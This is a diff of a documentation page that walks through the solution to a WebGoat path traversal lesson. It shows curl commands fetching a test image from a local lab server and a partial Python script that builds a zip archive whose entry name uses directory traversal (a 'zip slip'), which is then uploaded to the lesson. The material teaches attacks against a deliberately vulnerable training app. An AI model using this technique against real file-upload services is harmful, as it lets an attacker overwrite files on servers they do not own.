@@ -1,8 +1,15 @@
+---
+title: "A3:2021 | Path Transversal (8) | Cycubix Docs"
+layout: default
+nav_order: 8
+parent: "A3:2021 | Path Transversal | Cycubix Docs"
+grand_parent: "A3:2021 | Injection | Cycubix Docs"
+---
 # A3:2021 | Path Transversal (8) | Cycubix Docs
 
 #### Solution <a href="#solution" id="solution"></a>
 
-* As mentioned in the previous page, this is what happens when you create a zip file with an image inside:&#x20;
+* As mentioned in the previous page, this is what happens when you create a zip file with an image inside: 
 
 ```
 curl -o webwolf.jpg
@@ -43,7 +50,7 @@ cd C:\WebGoat\PathTraversal\username
 curl -o username.jpg http://127.0.0.1:9090/WebWolf/images/wolf.png
 ```
 
-* Create the Zip file with File Transversal:&#x20;
+* Create the Zip file with File Transversal: 
 
 ```
 import zipfile
@@ -57,13 +64,13 @@ with zipfile.ZipFile(zip_path, 'w') as zip_file:
     zip_file.write(file_to_add, traversal_path)
 ```
 
-* Run the script command:&#x20;
+* Run the script command: 
 
 ```
 python create_zip.py
 ```
 
-* Upload profile.zip into the previous lesson.&#x20;
+* Upload profile.zip into the previous lesson. 
 
 #### Why did this work? <a href="#why_did_this_work" id="why_did_this_work"></a>
 
